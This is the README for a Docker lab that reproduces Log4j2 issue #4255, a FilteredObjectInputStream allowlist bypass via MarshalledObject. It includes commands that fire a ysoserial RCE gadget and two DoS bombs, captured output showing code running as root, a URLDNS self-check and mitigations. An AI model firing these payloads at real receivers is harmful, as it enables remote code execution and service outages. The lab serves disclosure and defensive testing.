# log4j2 #4255 — self-contained reproduction lab

A one-command Docker lab for **Apache Log4j2 issue #4255**:
`FilteredObjectInputStream` (FOIS) allowlist bypass via `java.rmi.MarshalledObject`.
An unauthenticated attacker who can reach a serialized-`LogEvent` receiver gets
**remote code execution**, plus two denial-of-service variants — on the same
receiver, through the same bypass.

> ### Authorization & safety
> For **authorized local research only** — your own machine, your own containers.
> Everything runs in a disposable Docker container built from `./Dockerfile`; the
> **only outbound traffic is to Maven Central** (to fetch the official Log4j jars
> at build time). The `--oob` self-check is the one command that talks to a host
> you name — run it only against systems you own or are explicitly authorized to
> test. Nothing here should be pointed at third-party infrastructure.

## What the bug is

FOIS overrides `resolveClass` with a name **allowlist** — but the allowlist keeps
`java.rmi.MarshalledObject`. A `MarshalledObject` stores its payload as an opaque
`byte[]`, so the `resolveClass` filter never inspects it. When Log4j rebuilds the
event, `Log4jLogEvent$LogEventProxy.readResolve()` reconstructs the message by
calling `marshalledMessage.get()` — and `MarshalledObject.get()` deserializes
those bytes on a **fresh, unfiltered `ObjectInputStream`**. Any Java gadget on the
inner stream runs; it never has to implement `Message` or pass the allowlist.

The lab wraps three different inner graphs in that identical envelope
(`LogEventProxy → MarshalledObject{objBytes = inner}`):

| impact | inner graph | result |
|---|---|---|
| **RCE** | a ysoserial `CommonsCollections6` gadget | shell command runs as the receiver's user |
| **OOM** | `Object[]` of length `2^31-1` (~44 bytes on the wire) | `OutOfMemoryError: Requested array size exceeds VM limit` |
| **CPU-DoS** | nested-`HashSet` bomb, depth 100 (~5.7 KB) | receiver thread pins a core on ~2¹⁰⁰ `hashCode()` calls, forever |

## Requirements

- Docker (tested on v28)
- `python3` on the host (the payload builder is pure Python — no JVM, no jars)
- For the **RCE** step only: a ysoserial jar you supply. It is large and
  third-party, so it is intentionally not bundled:
  ```bash
  # from https://github.com/frohoff/ysoserial
  export YSOSERIAL=/path/to/ysoserial.jar
  ```

Everything else (the Log4j jars, the JVM, `javac`) lives inside the container.

## Quickstart

```bash
YSOSERIAL=/path/to/ysoserial.jar ./run.sh demo
```

The whole story: start a vulnerable receiver → fire one packet → code runs as
root → restart **with the mitigation** → same packet is blocked → restart
vulnerable → fire the OOM bomb. Real output:

```
[*] cleaned lab container
[*] VULNERABLE receiver on :4560
[receiver] FOIS bridge on 0.0.0.0:4560  filter=<none>

=== 1) VULNERABLE — one packet, code runs as root ===
[*] before:  ls: cannot access '/tmp/PWNED_4255': No such file or directory
[*] firing CommonsCollections6 gadget wrapped in MarshalledObject -> touch /tmp/PWNED_4255
[*] built LogEventProxy payload: 1537 bytes (gadget from - (1294 bytes))
[+] fired at 127.0.0.1:4560
[+] RCE CONFIRMED — -rw-r--r-- 1 root root 0 Aug 28 21:29 /tmp/PWNED_4255 (ran as: root)
[*] receiver log: [receiver] processed event OK: msg="null"

[*] receiver WITH mitigation -Djdk.serialFilter='!java.rmi.MarshalledObject'
[receiver] FOIS bridge on 0.0.0.0:4560  filter=!java.rmi.MarshalledObject

=== 2) MITIGATED — same packet, blocked ===
[*] before:  ls: cannot access '/tmp/PWNED_4255': No such file or directory
[*] firing CommonsCollections6 gadget wrapped in MarshalledObject -> touch /tmp/PWNED_4255
[*] built LogEventProxy payload: 1537 bytes (gadget from - (1294 bytes))
[+] fired at 127.0.0.1:4560
[-] no marker — receiver rejected it (mitigation on?) or no usable gadget
[*] receiver log: [receiver] readObject REJECTED/failed: java.io.InvalidClassException: filter status: REJECTED

[*] VULNERABLE receiver on :4560
[receiver] FOIS bridge on 0.0.0.0:4560  filter=<none>

=== 3) OOM DoS — 44-byte packet, receiver dies ===
[*] firing Object[] 2^31-1 bomb (~44 bytes) -> OOM in the receiver
[*] built LogEventProxy payload: 287 bytes (Object[] 2^31-1 OOM bomb)
[+] fired at 127.0.0.1:4560
[*] receiver log: [receiver] readObject REJECTED/failed: java.lang.OutOfMemoryError: Requested array size exceeds VM limit
```

The receiver logs `msg="null"` on a successful RCE because the marshalled message
reconstructs to nothing observable — a fired payload and a benign one look the
same in the log. The side effect (the marker file) is the proof.

## Commands

| command | what it does |
|---|---|
| `./run.sh up` | start a vulnerable receiver (Log4j 2.26.1 + commons-collections 3.2.1) on `:4560` |
| `./run.sh pwn` | build a ysoserial gadget, wrap it, fire it → root-owned `/tmp/PWNED_4255` appears |
| `./run.sh safe` | restart the receiver with `-Djdk.serialFilter='!java.rmi.MarshalledObject'` |
| `./run.sh oom` | fire the `Object[]` 2³¹-1 bomb → `OutOfMemoryError` in the receiver |
| `./run.sh dos` | fire the nested-`HashSet` CPU bomb → receiver pins a core (no natural recovery) |
| `./run.sh demo` | the full story above |
| `./run.sh logs` | tail the receiver log |
| `./run.sh clean` | remove the lab container |

### CPU-DoS — captured

```
$ ./run.sh up && ./run.sh dos 100
[gen] nested-HashSet bomb depth=100 -> 5744 bytes
[*] built LogEventProxy payload: 5987 bytes (gadget from - (5744 bytes))
[+] fired at 127.0.0.1:4560
[*] receiver thread is now pinning a core on ~2^100 hashCode() calls.

$ docker stats --no-stream log4j4255-recv
log4j4255-recv CPU=101.10% MEM=52.86MiB / 15.29GiB
```

101% CPU on a 5.7 KB packet; memory stays flat — it is pure CPU burn, and the
thread never returns. `./run.sh clean` is the only way out.

## Am I vulnerable? — `selfcheck.sh`

Two checks, **neither runs code on the target**.

```bash
./selfcheck.sh --scan /path/to/app/lib        # STATIC: flag affected jars (2.8.0–2.26.1)
./selfcheck.sh --dns                           # DYNAMIC, fully local: safe URLDNS proof
./selfcheck.sh --oob YOUR-ID.oast.pro HOST PORT  # DYNAMIC vs a host you're AUTHORIZED to test
```

The dynamic checks send only a gadget-free `HashMap → java.net.URL` chain
(`URLDNS`): a vulnerable receiver performs a DNS lookup of a unique hostname, which
proves the inner stream is unfiltered. A callback = vulnerable; no callback but the
connection succeeded = filter intact; connection refused = nothing listening. The
static scan flagging a jar is *necessary, not sufficient* — you are only exploitable
if the app also exposes a serialized-`LogEvent` receiver on the network.

Captured `--dns` run:

```
[*] self-contained dynamic check (safe URLDNS, no code execution)
[*] local DNS sink at 10.200.0.2
[*] sending gadget-free URLDNS probe -> selfcheck-3035026-1787952535.oob.local
[VULNERABLE] the receiver resolved our hostname — inner stream is UNFILTERED
    QUERY selfcheck-3035026-1787952535.oob.local
```

## How it works (the envelope)

`payload.py` is a small pure-Python Java-serialization writer. It emits, in order:

```
LogEventProxy                       <- FOIS allows it (real Log4j class)
 └─ MarshalledObject                <- FOIS allows it (on the allowlist!)
     └─ objBytes: byte[]            <- an opaque blob, never filtered
         └─ <inner gadget stream>   <- deserialized on a NEW, UNFILTERED stream
```

FOIS checks class names as it reads the outer stream, and every class it sees is
allowed. It never looks inside `objBytes`. `LogEventProxy.readResolve()` then calls
`MarshalledObject.get()`, which spins up a plain `ObjectInputStream` over those
bytes with no filter at all — and the gadget fires. The receiver in `Receiver.java`
is a ~40-line stand-in for the Log4j samples' `ObjectInputStreamLogEventBridge` /
`TcpSocketServer`; the `.get()` call is Log4j's own code, triggered automatically
because the payload's outer class is the real `LogEventProxy`.

## Mitigation

- **Blocks RCE:** run the receiver JVM with
  `-Djdk.serialFilter='!java.rmi.MarshalledObject'`. This rejects the
  `MarshalledObject` class outright (`filter status: REJECTED` above), which also
  happens to stop the two DoS payloads here — because they ride the same wrapper.
- **But it is not a resource limit.** FOIS has no `maxarray`/`maxdepth`, so a bare
  array/depth bomb built from an already-allowlisted class (e.g. a top-level
  `byte[]`) still gets through the class filter. Real resource safety needs a
  proper `ObjectInputFilter` with size and depth limits.
- **Durable fix:** stop transporting Java-serialized `LogEvent`s. Use a JSON or
  RFC 5424 text layout over the socket. Log4j 3.x drops the serialized pattern.

## Cleanup

```bash
./run.sh clean                 # remove the receiver container
docker rmi log4j4255           # remove the built image (optional)
```

Containers are `--rm`, so a crash or `docker rm -f` leaves nothing behind. The
marker file lives only inside the disposable container.

## Scope & honesty

This is an **application-conditional** RCE, not a universal Log4j bug. The
vulnerable receiver is **not a default Log4j service** — Apache removed the in-core
socket server after 2.8.2, so a modern deployment only exposes this pattern if it
runs a custom or sample serialized-`LogEvent` receiver on the network. High impact,
low prevalence: trivial to exploit once you find a receiver, hard to find one. The
affected range is log4j-core **2.8.0 – 2.26.1**; the lab pins 2.26.1 (HEAD) on
JDK 17. `CommonsCollections6`/`7` fire on JDK 17; `TemplatesImpl`-based chains are
blocked by JDK 16+ module encapsulation. The gadget command runs via
`Runtime.exec()`, which does **not** invoke a shell — single-token arguments only
(`touch /tmp/x` works; `id > /tmp/x` would not redirect).

## Attribution

- Original report — Apache Log4j2 issue
  [#4255](https://github.com/apache/logging-log4j2/issues/4255), by U-Sec / Wujie
  Security (the original write-up has since been deleted).
- PoCs — [joanbono/log4j2-4255-exploit](https://github.com/joanbono/log4j2-4255-exploit)
  and [dinosn/log4j-4255](https://github.com/dinosn/log4j-4255).
- RCE gadgets — [frohoff/ysoserial](https://github.com/frohoff/ysoserial).
- CPU-DoS technique — Wouter Coekaerts, *"SerialDOS"* (2015),
  <https://gist.github.com/coekie/a27cc406fc9f3dc7a70d>.

## Disclaimer

Provided for defensive security research and authorized testing only. Running it
against systems you do not own or have explicit written permission to test may be
illegal. The authors accept no liability for misuse.
